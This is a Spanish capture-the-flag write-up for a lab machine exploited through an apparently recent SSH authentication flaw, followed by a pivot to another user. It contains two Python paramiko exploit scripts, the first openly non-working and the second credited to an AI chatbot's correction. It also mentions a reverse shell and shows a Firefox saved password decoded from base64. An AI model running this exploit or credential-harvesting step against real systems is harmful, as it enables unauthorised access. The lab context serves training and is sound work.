---
title: "Explotación de *sshole"
date: 2026-11-22 
excerpt: "Reventando SSH!"
toc: true
toc_label: "Contenido"
toc_icon: "list"
toc_sticky: true
---

Esta maquina trata la reciente vulnerabilidad encontrada en SSH.
# Reconocimiento
Realizamos el usual escaneo con **nmap** y obtenemos lo siguiente:
```java
Starting Nmap 7.993 ( https://nmap.org ) at 2026-11-22 16:26 +0100
Nmap scan report for 10.129.147.175
Host is up (0.044s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 10.6 (protocol 2.0)
80/tcp open  http    nginx 1.24.0 (Ubuntu)
|_http-server-header: nginx/1.24.0 (Ubuntu)
| http-auth: 
| HTTP/1.1 401 UNAUTHORIZED\x0D
|_  Basic realm=Zentara
|_http-title: Site doesn't have a title (text/html; charset=utf-8).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
Esta máquina nos expone un servicio **http** en el cual hay que loggearse así como un servicio **ssh v10.6**. Todo muy básico, nada fuera de lo normal. Voy a realizar un poco de fuzzing para comprobar si hay algún subdirectorio interesante, pero tiene pinta que habrá que atentar contra el login http:
```
docs                    [Status: 401, Size: 0, Words: 1, Lines: 1, Duration: 52ms]
files                   [Status: 401, Size: 0, Words: 1, Lines: 1, Duration: 53ms]
status                  [Status: 401, Size: 0, Words: 1, Lines: 1, Duration: 45ms]
usage                   [Status: 401, Size: 0, Words: 1, Lines: 1, Duration: 82ms]
settings                [Status: 401, Size: 0, Words: 1, Lines: 1, Duration: 59ms]
agents                  [Status: 401, Size: 0, Words: 1, Lines: 1, Duration: 137ms]
deploy                  [Status: 401, Size: 0, Words: 1, Lines: 1, Duration: 175ms]
```
Agents? Voy a intentar realizar banner grabing contra los dos puertos a ver si obtenemos algún tipo de información. No consigo nada. Por lo tanto todo indica a que tenemos que loggearnos.

# \*sshole 
Bueno, esta es un vulnerabilidad cuanto menos interesante. No voy a dedicarme a explicarla en este writeup porque es bastante sencilla de entender, aqui teneis la mejor explcación que hay: [*sshole](https://sshhole.com/)

Se trata de un simple atque de fuerza bruta mediante el cual, por errores de implementación a lo largo de los años, en concreto, con relación a la libreria *musl lib* podemos obtener una shell! 
## Payload
Una contraseña menor a 256 bytes no activa el error de la función `crypt()`, por tanto no devolverá el `*` que causa todo el error. También se ha visto que las contraseñas de más de **1024**b pueden dar errores. Dentro de ese rango **256 < payload < 1024** debería funcionar. En nuestro caso el usuario vulnerable es el usuario `alpine` indicado en el CVE. Programemos un script en python para enviar este payload.

```python
import paramiko
import time

host = input("[+] Ip de la máquina: ")
puerto = 22
user = "alpine"
def intentar_login():
    try:
        cliente.connect(
                hostname=host,
                port=puerto,
                username=user,
                password=bytes_de_password,
                timeout=10,
                allow_agent=False,
                look_for_keys=False
                )
        print(f"[+] Autenticación exitosa con el payload de {len(bytes_de_password)} bytes.\n")
        return True
    except paramiko.AuthenticationException:
        print(f"[!!] Fallo de autenticación con el payload de {len(bytes_de_password)} bytes.\n")
        return False
    except Exception as e:
        print(f"[!!] Error: \n{e}\n")
    finally:
        cliente.close()
def main():
    print("[+] Realizando priming\n")
    intentar_login(b"contrasena_de_prueba")
    time.sleep(2)
    while True:
        try:
            bytes_a_enviar = int(input("[?] Introduzca bytes a enviar ( entre 256 y 1024 -> 300b recomendados) > "))
            break
        except ValueError:
            print("\n[!] Porfavor introduca un numero entero valido\n")
    print(f"[+] Enviando {bytes_a_enviar} bytes")
    payload = b"A"*bytes_a_enviar
    intentar_login(payload)
if __name__ == '__main__':
    main()
```

Esta versión del script no funciona ya que las dos peticiones tienen que realizarse mediante una misma y única conexión SSH. Preguntandole a deepseek, hay que usar otra implementación, esto es lo que me da como corrección.

```python
import paramiko
import time

host = input("[+] Ip de la máquina: ")
puerto = 22
user = "alpine"

def intentar_login(transport, bytes_de_password, etiqueta):
    """Intenta autenticarse usando un Transport ya existente."""
    try:
        # auth_password lanza AuthenticationException si falla
        transport.auth_password(user, bytes_de_password)
        print(f"[+] Autenticación exitosa ({etiqueta}) con {len(bytes_de_password)} bytes.\n")
        return True
    except paramiko.AuthenticationException:
        print(f"[!!] Fallo de autenticación ({etiqueta}) con {len(bytes_de_password)} bytes.\n")
        return False
    except Exception as e:
        print(f"[!!] Error inesperado ({etiqueta}): {e}\n")
        return False

def main():
    # 1. Crear UNA SOLA conexión SSH de bajo nivel
    try:
        transport = paramiko.Transport((host, puerto))
        transport.start_client(timeout=10)
    except Exception as e:
        print(f"[!!] No se pudo conectar a {host}:{puerto}: {e}")
        return

    try:
        # 2. Primer intento con el payload largo (esto es el "priming")
        print("[+] Realizando priming (primer intento con 300 bytes)...\n")
        intentar_login(transport, b"A" * 300, "priming")
        time.sleep(1)  # Pausa breve, como en el PoC

        # 3. Bucle para el segundo intento (el que debería funcionar)
        while True:
            try:
                bytes_a_enviar = int(input("[?] Bytes a enviar (entre 256 y 1024) > "))
                if 257 <= bytes_a_enviar <= 1024:
                    break
                print("[!] El valor debe estar entre 257 y 1024.\n")
            except ValueError:
                print("\n[!] Introduce un número entero válido.\n")

        print(f"[+] Enviando segundo intento con {bytes_a_enviar} bytes...")
        payload = b"A" * bytes_a_enviar

        if intentar_login(transport, payload, "segundo intento"):
            # Si funciona, abrimos un canal para ejecutar comandos
            chan = transport.open_session()
            chan.exec_command('id; uname -a')
            print(chan.recv(4096).decode())

    finally:
        transport.close()

if __name__ == '__main__':
    main()
```

Lo que nos ejecuta exitosamente el `id`. Pues una vez entendida esta vulnerabilidad pasemos a la post-explotación y escalada de privilegios. Nos enviamos una reverse shell con mkfifo...

# Pivoting
Es la hora de pivotar hacia el otro usuario del sistema `/home/bob` ya que la clave del `user.txt` solo tiene permisos de lectura para el. Voy a realizar un escaneo rápido con **linpeas**. De entre todos los resultados (que ahora nos convienen, porque hay CVEs en el kernel) he encontrado posibles credenciales de firefox del usuario bob:
```json
{
  "nextId": 2,
  "logins": [
    {
      "id": 1,
      "hostname": "http://172.17.0.1",
      "httpRealm": "Zentara",
      "formActionOrigin": null,
      "usernameField": "",
      "passwordField": "",
      "encryptedUsername": "Ym9i",
      "encryptedPassword": "Q29ycmVjdEhvcnNlQmF0dGVyeVN0YXBsZQ==",
      "guid": "{a1b2c3d4-e5f6-7890-abcd-ef1234567890}",
      "encType": 0,
      "timeCreated": 1730000000000,
      "timeLastUsed": 1730900000000,
      "timePasswordChanged": 1730000000000,
      "timesUsed": 14
    }
  ],
  "potentiallyVulnerablePasswords": [],
  "dismissedBreachAlertsByLoginGUID": {},
  "version": 3
}
```

Tiene pinta de que estan encodeadas en base 64 por ese `==` del final. Vamos a probar:
```bash
> echo "Q29ycmVjdEhvcnNlQmF0dGVyeVN0YXBsZQ==" | base64 -d

CorrectHorseBatteryStaple
```

Y si nos conectamos por SSH -> **USER FLAG OBTENIDA**

(Durante esta semana subo lo que falta.)
